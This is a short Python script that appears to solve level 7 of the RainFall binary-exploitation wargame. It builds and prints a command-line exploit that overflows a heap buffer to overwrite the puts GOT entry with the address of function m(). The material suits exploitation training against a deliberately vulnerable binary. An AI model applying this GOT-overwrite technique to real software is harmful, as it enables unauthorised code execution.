#!/usr/bin/env python3
"""Level7: transform offset + GOT puts + m() address into final argv exploit command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

# From GDB: readelf -r → puts GOT 0x8049928; info functions m → 0x080484f4
OFFSET = 20  # RainFall: bytes in argv[1] before the 4 bytes that overwrite ptr2[1]
GOT_PUTS = 0x8049928
M_ADDR = 0x080484f4

def main():
    got_le = p32(GOT_PUTS)
    m_le = p32(M_ADDR)
    arg1 = "A" * OFFSET + got_le.decode("latin1")
    arg2 = m_le.decode("latin1")
    cmd = (
        f'./level7 $(python -c \'print "A"*{OFFSET} + "\\x{got_le[0]:02x}\\x{got_le[1]:02x}\\x{got_le[2]:02x}\\x{got_le[3]:02x}"\') '
        f'$(python -c \'print "\\x{m_le[0]:02x}\\x{m_le[1]:02x}\\x{m_le[2]:02x}\\x{m_le[3]:02x}"\')'
    )
    print(cmd)
    print("# offset =", OFFSET, ", GOT puts =", hex(GOT_PUTS), ", m =", hex(M_ADDR))

if __name__ == "__main__":
    main()
